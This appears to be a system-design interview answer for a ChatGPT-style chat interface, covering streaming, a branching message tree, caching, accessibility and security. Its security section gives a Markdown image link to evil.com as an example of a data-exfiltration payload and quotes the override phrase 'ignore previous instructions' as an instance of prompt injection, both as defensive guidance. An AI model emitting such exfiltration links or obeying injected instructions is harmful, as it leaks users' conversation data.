# 01 · ChatGPT-style chat UI: solution

## R: Requirements

### Functional

1. Send a message and see the assistant's answer **stream** token by token.
2. **Stop** a response. The partial text is kept and marked "stopped".
3. **Regenerate** the last answer. Both versions stay available.
4. **Edit** an earlier user message. This creates a new branch, and the user can switch between branches.
5. **History sidebar:** list of conversations grouped by date, with rename, delete, and search.
6. **Markdown** rendering with tables, lists, links, math (optional), and **code blocks** with syntax highlighting and a Copy button.
7. **Attachments:** images and files, with upload progress and preview.
8. Feedback: thumbs up/down per answer, copy message.
9. Reload the page mid-stream and see either the finished answer or the stream resumed.

### Non-functional

| Area | Target |
|---|---|
| Perceived latency | First token visible within the model's TTFT + < 50 ms of client overhead. Show a "thinking" state right away. |
| Smoothness | Streaming must not drop frames. Input stays responsive (INP < 200 ms) during a 2,000-token answer. |
| Long conversations | 500+ messages scroll smoothly. |
| Security | No XSS from model output. No secrets in the client. |
| Accessibility | Screen readers get the answer without hearing every token. Full keyboard use. |
| i18n | RTL support. Mixed LTR code inside RTL text. |
| Reliability | Survive network drops, 429s, and tab sleep. Never lose a sent message. |

## A: Architecture

```
┌──────────────────────────── Browser ─────────────────────────────┐
│                                                                   │
│  UI (React)                                                       │
│  ┌──────────┐  ┌───────────────────────────────────────────────┐  │
│  │ Sidebar  │  │ ChatView                                      │  │
│  │ (history,│  │  MessageList (virtualized)                    │  │
│  │  search) │  │   MessageItem → MarkdownRenderer → CodeBlock  │  │
│  └────┬─────┘  │  Composer (textarea, attachments, send/stop)  │  │
│       │        └──────────────────┬────────────────────────────┘  │
│       │                           │                               │
│  ┌────▼───────────────────────────▼─────────────┐                 │
│  │ Conversation store (normalized message tree)  │◄── IndexedDB   │
│  └────┬───────────────────────────┬─────────────┘    (offline     │
│       │                           │                   cache)      │
│  ┌────▼──────────┐        ┌───────▼──────────┐                    │
│  │ REST client   │        │ Stream client    │                    │
│  │ (history,     │        │ fetch + Readable │                    │
│  │  uploads)     │        │ Stream, SSE parse│                    │
│  └────┬──────────┘        └───────┬──────────┘                    │
└───────┼───────────────────────────┼───────────────────────────────┘
        │ HTTPS                     │ HTTPS (POST, streamed response)
┌───────▼───────────────────────────▼───────────────────────────────┐
│ API gateway (auth, rate limit per user, request ids)              │
├───────────────────────┬───────────────────────────────────────────┤
│ Conversation service  │ Generation service                        │
│ (CRUD, tree, search)  │  builds prompt (history, files, system)   │
│                       │  calls model, streams tokens,             │
│                       │  writes chunks to a run log (resume)      │
├───────────────────────┼───────────────────────────────────────────┤
│ DB (conversations,    │ Run log (Redis stream / Kafka)  Model API │
│ messages, branches)   │ Object storage (uploads)                  │
└───────────────────────┴───────────────────────────────────────────┘
```

**Rendering strategy:** this is an authenticated app with no SEO needs. Use a client-rendered SPA shell, served from a CDN. Optionally server-render the shell and the sidebar for a faster first paint. Code-split heavy parts: the Markdown renderer, the syntax highlighter languages, and the math renderer.

### Component tree

```
<App>
  <Sidebar>
    <NewChatButton/>
    <SearchBox/>
    <ConversationList/>      (virtualized, grouped by date)
  </Sidebar>
  <ChatView conversationId>
    <MessageList>            (virtualized, anchored to bottom)
      <MessageItem>          (memoized per message id)
        <BranchSwitcher/>    (< 2/3 >)
        <MarkdownRenderer/>  (incremental while streaming)
          <CodeBlock/>       (highlight on idle, Copy button)
        <Attachments/>
        <MessageActions/>    (copy, regenerate, edit, feedback)
      </MessageItem>
    </MessageList>
    <ScrollToBottomButton/>
    <Composer>
      <AttachmentTray/>
      <Textarea/>
      <SendOrStopButton/>
    </Composer>
  </ChatView>
</App>
```

## D: Data model

A conversation is a **tree**. Each message points to its parent. The UI shows one path from the root to the "current leaf". Regenerate = a new assistant child of the same user message. Edit = a new user child of the same parent.

```ts
type Role = 'user' | 'assistant' | 'system' | 'tool';

type Conversation = {
  id: string;
  title: string;
  createdAt: string;
  updatedAt: string;
  currentLeafId: string; // which branch is selected
  model: string;
};

type Message = {
  id: string;
  conversationId: string;
  parentId: string | null;
  role: Role;
  content: ContentPart[];
  status: 'complete' | 'streaming' | 'stopped' | 'error';
  createdAt: string;
  model?: string;
  usage?: { inputTokens: number; outputTokens: number };
  feedback?: 'up' | 'down';
};

type ContentPart =
  | { type: 'text'; text: string }
  | { type: 'image'; fileId: string; width: number; height: number; alt?: string }
  | { type: 'file'; fileId: string; name: string; mimeType: string; size: number };

// Client store, normalized
type ChatState = {
  conversations: Record<string, Conversation>;
  messages: Record<string, Message>;
  childrenByParent: Record<string, string[]>; // ordered siblings = branches
  activeRun: { conversationId: string; messageId: string; runId: string; controller: AbortController } | null;
};
```

**The visible thread** = walk from `currentLeafId` up through `parentId` to the root, then reverse. To switch branches, pick a sibling, then follow its *last selected* (or newest) child down to a leaf. Store a per-node "selected child" so switching back restores the deeper choice.

**Why a tree, not an array:** with an array, editing message 3 would mean deleting messages 4–20 or copying the conversation. The tree keeps every version, and storage is cheap.

## I: Interface / API

### REST

```
GET    /api/conversations?cursor=…&limit=50        → { items: ConversationSummary[], nextCursor }
GET    /api/conversations/:id                       → { conversation, messages: Message[] }  (whole tree)
PATCH  /api/conversations/:id                       { title?, currentLeafId? }
DELETE /api/conversations/:id
GET    /api/search?q=…                              → { hits: { conversationId, messageId, snippet }[] }
POST   /api/files  (multipart or presigned URL)     → { fileId }
POST   /api/messages/:id/feedback                   { value: 'up' | 'down', comment? }
```

Cursor pagination for the sidebar: conversations are sorted by `updatedAt`, and new ones appear at the top while you scroll, so offsets would skip or repeat items.

### Streaming: starting a run

```
POST /api/conversations/:id/runs
Headers: Idempotency-Key: <client-generated uuid>
Body: { parentId: string, userMessage?: { content: ContentPart[] }, regenerate?: boolean, model: string }

Response: 200, Content-Type: text/event-stream

event: run.created
data: {"runId":"r_1","userMessageId":"m_10","assistantMessageId":"m_11"}

event: delta
id: 1
data: {"text":"Hello"}

event: delta
id: 2
data: {"text":" world"}

event: done
data: {"status":"complete","usage":{"inputTokens":812,"outputTokens":245}}

event: error
data: {"code":"rate_limited","retryAfterMs":4000}
```

```
POST /api/runs/:runId/cancel           → stops generation on the server
GET  /api/runs/:runId/stream?after=17  → resume from event id 17 (SSE)
```

### Protocol choice

| Option | Pros | Cons | Verdict |
|---|---|---|---|
| **`fetch` POST + `ReadableStream` reading SSE-format events** | POST with a body and auth headers. `AbortController` for Stop. Works over HTTP/2. Simple server. | Must parse SSE by hand (chunks split lines and multi-byte characters). | **Chosen** for sending. |
| `EventSource` (native SSE) | Auto-reconnect, `Last-Event-ID` | GET only, no custom headers (cookies only) | Good for the **resume** endpoint. |
| WebSocket | Bidirectional, one connection for many chats | Stateful servers, harder load balancing, proxies, no HTTP caching or auth headers per message, must build your own reconnect | Only if we also need server push for other things (multi-device sync, collaboration). |

**Stop button:**
1. `controller.abort()` on the fetch, which stops reading the stream.
2. Also `POST /runs/:id/cancel`. Closing the connection usually tells the server, but proxies may buffer, and an explicit cancel guarantees we stop paying for tokens.
3. Mark the message `stopped` and keep the partial text.

**Resume after reload:** the generation service writes every delta into a run log (for example a Redis stream with a TTL of a few minutes) keyed by `runId`. On reload, the client sees a message with `status: 'streaming'` and opens `GET /runs/:runId/stream?after=<lastId>`. If the run already finished, the server returns the final message.

## Client state and caching

- **Store:** a normalized message tree (Zustand/Redux or a custom store with `useSyncExternalStore`). Components subscribe to *one message by id*, so a token update re-renders **only** the streaming message, not the list.
- **Server cache:** React Query for conversation lists and conversation details, with optimistic updates for rename, delete, and feedback.
- **Offline:** cache the last N conversations in IndexedDB. A service worker caches the app shell. When offline, show history read-only and disable Send with a clear message.
- **Outbox:** a sent user message is written to the store (and IndexedDB) **before** the request. If the request fails, show "Not sent · Retry". Never lose what the user typed.
- **Drafts:** save the composer text per conversation in `localStorage`, debounced.

## O: Optimizations

### 1. Streaming render performance

The naive version does `setState(text + token)` for every token, re-parses the **whole** Markdown, and re-highlights **all** code. That's O(n²) work over a long answer, and the main thread chokes.

- **Batch tokens per frame.** Append tokens into a buffer (a ref), and flush to state once per `requestAnimationFrame`. 50 tokens/s becomes at most 60 renders/s, and usually far fewer DOM changes.
- **Incremental Markdown.** Split the text into *blocks* (paragraphs, list items, code fences). Completed blocks are memoized by content and never re-parsed. Only the **last, open block** is re-parsed on each flush.
- **Handle unclosed syntax.** While streaming, a code fence or `**bold` may not be closed yet. Render the open block as if it were closed (auto-close the fence) to avoid flicker.
- **Code highlighting.** Show plain monospace text while a code block is still streaming. Highlight once the block is complete, on `requestIdleCallback` or in a **Web Worker**. Lazy-load language grammars.
- **Isolate re-renders.** Only `MessageItem(id=streaming)` subscribes to changes. Memoize everything else.
- **Virtualize the list** for long conversations. It must support dynamic heights (measure with `ResizeObserver`) and "stick to bottom" behavior.

### 2. Scrolling behavior

- Auto-scroll only if the user is near the bottom. If they scrolled up to read, show a "↓ New content" button instead.
- `overflow-anchor` / scroll anchoring keeps the position stable when content above changes height (images loading).
- Reserve space for images with known `width`/`height` to avoid layout shift.

### 3. Network

- HTTP/2 or HTTP/3. Keep-alive.
- Start the request immediately on Send, and render the user message optimistically.
- **Heartbeat** comments (`: ping`) every 15 s, so proxies don't close idle streams during long "thinking" pauses.
- Turn off proxy buffering for the stream (`X-Accel-Buffering: no` on nginx), or the user sees nothing until the end.

### 4. Uploads

- Upload as soon as the file is attached (before Send), with progress, using presigned URLs straight to object storage.
- Resize large images on the client (canvas / `createImageBitmap`) before upload to save bandwidth.
- Send waits until uploads finish, or sends `fileId`s that the server resolves.

### 5. Bundle

- Code-split the Markdown + highlighter + KaTeX chunk. Prefetch it after first paint.
- Load highlighter languages on demand when a fence like ```` ```python ```` appears.

## Accessibility

- The message list uses `role="log"`. Don't put `aria-live` on the streaming text, or screen readers try to read every token. Instead, announce "Assistant is responding" at the start, and "Response complete" plus the final text (or a short summary) once the stream finishes, in a separate polite live region.
- The Stop button has a clear label and keeps focus where it was.
- Keyboard: Enter sends, Shift+Enter adds a newline, Esc stops generation, and arrow keys switch branches when the switcher is focused.
- Code blocks: the Copy button is a real `<button>` with "Copied" feedback announced politely.
- Respect `prefers-reduced-motion` (no typing-cursor animations).

## i18n / RTL

- Set `dir="auto"` on each message so a Persian answer renders RTL and an English one LTR, even in the same conversation.
- Code blocks are always `dir="ltr"`.
- Use logical CSS properties (`margin-inline-start`) so the layout mirrors correctly.
- Translate dates and number formats with `Intl`. Text search must handle Persian/Arabic normalization (for example ي vs ی, and ك vs ک).

## Security

- **Model output is untrusted input.** Render Markdown with **raw HTML disabled**, then sanitize the resulting HTML (DOMPurify or an allowlist renderer that builds React elements directly, with no `dangerouslySetInnerHTML`).
- **Links:** allow only `http`/`https`/`mailto`. Add `rel="noopener noreferrer nofollow"`. Consider showing the full URL on hover, because a model can be tricked into producing phishing links.
- **Images in Markdown** (`![](https://evil.com/?data=…)`) can leak conversation data through the URL. This is a known exfiltration path for prompt injection. Proxy external images or block them.
- **CSP:** `script-src 'self'`, no `unsafe-inline`, strict `img-src`.
- **Prompt injection:** uploaded files and web content can contain instructions ("ignore previous instructions…"). The server should separate system instructions from user and file content, and tools with side effects need confirmation. The UI should make clear which content came from files.
- **Auth:** HttpOnly session cookies plus CSRF protection, or short-lived tokens. The client **never** holds model API keys.
- **PII:** don't log full prompts in client analytics. Offer "delete conversation" that really deletes it.

## Failure modes

| Failure | Handling |
|---|---|
| Network drops mid-stream | Keep the partial text. Try to resume with the last event id. If that fails: "Connection lost · Retry". |
| 429 rate limit | Show a friendly message with the wait time from `Retry-After`. Don't auto-retry in a tight loop; use exponential backoff with jitter and a cap. |
| Model error / overload | "Something went wrong · Regenerate". Optionally fall back to a smaller model and label the answer with the model used. |
| Tab sleeps (mobile) | The server finishes the run. On resume, fetch the final message. |
| Double click on Send | The Idempotency-Key makes the server create the run only once. |
| Very long answer | Respect `max_tokens`. Show a "Continue" button when the model stopped because of the length limit. |

## Cost and latency

- **TTFT** is dominated by queueing and prompt size. Keep the prompt short: summarize or trim old turns past a token budget, and send only the active branch.
- **Prompt caching:** keep the system prompt and old history as a stable prefix so the provider can cache it. Many APIs discount cached input tokens heavily. Don't put changing data (like the current time) at the top of the prompt.
- **Model routing:** use a small fast model for title generation and for simple requests, and the large model for the main answer.
- **Generate titles asynchronously** after the first answer, with a cheap model.
- **Stop = save money:** make sure cancel really reaches the model call.

## Observability and evals

- Client metrics: TTFT as seen by the user (send → first painted token), tokens/s, stream error rate, stop rate, regenerate rate, and long tasks during streaming.
- Product quality signals: thumbs up/down, regenerate rate, copy rate, conversation length.
- Every run carries a `runId`, logged on the client and the server for tracing.
- Offline eval sets run before shipping any prompt or model change.

## Trade-offs

| Decision | Alternative | Why |
|---|---|---|
| fetch + SSE format | WebSocket | Stateless, works with HTTP infra, POST body, simple abort |
| Message tree | Flat array + copies | Edits and regenerations without data loss |
| Highlight after block completes | Highlight every flush | Avoids O(n²) work and flicker |
| rAF batching | Render per token | Smooth at high token rates |
| Server keeps generating after disconnect | Cancel on disconnect | Better UX for reload or tab sleep, but costs tokens. Cancel only on an explicit Stop. |
| Client SPA | SSR everything | Auth-only app, no SEO, streaming is client-driven |

## Follow-up questions

- **"How do you make Stop instant even if the server is slow to cancel?"** Abort the fetch immediately and update the UI. Send the cancel request in the background. Ignore late deltas for a run marked stopped.
- **"Two tabs open on the same conversation?"** Use `BroadcastChannel` to sync stores between tabs, or server push. Last write wins for the title. Runs are tied to the tab that started them, but the other tab can follow the stream through the resume endpoint.
- **"How would you add 'thinking' / reasoning display?"** As a separate content part type, collapsed by default, streamed through its own event type.
- **"How do you search 10k conversations quickly?"** Server-side full-text search (Postgres FTS / Elasticsearch) with Persian/Arabic normalization. Recent ones can also be filtered on the client.
- **"How would you test streaming?"** Make the stream client a pure function from bytes to events, and unit-test it with chunks split at awkward places. Test components with a fake async iterator. Run e2e tests against a mock server that streams with delays.

## Senior vs mid-level answer

| Mid-level | Senior |
|---|---|
| "Use WebSocket for streaming" | Compares fetch streaming, SSE, and WebSocket, and picks one with reasons |
| `setState(text + token)` | Batches per frame, incremental Markdown, memoized blocks, highlights off the main path |
| Flat message array | Message tree with branches and a selected child per node |
| Stop = hide the spinner | Stop aborts the fetch and cancels server generation (cost) |
| `dangerouslySetInnerHTML(marked(text))` | Raw HTML off + sanitizer, link and image exfiltration, CSP, prompt injection |
| Ignores failures | Resume with event ids, 429 handling, idempotency keys, outbox |
| No mention of a11y | Live-region strategy for streaming text, `dir="auto"` for RTL |
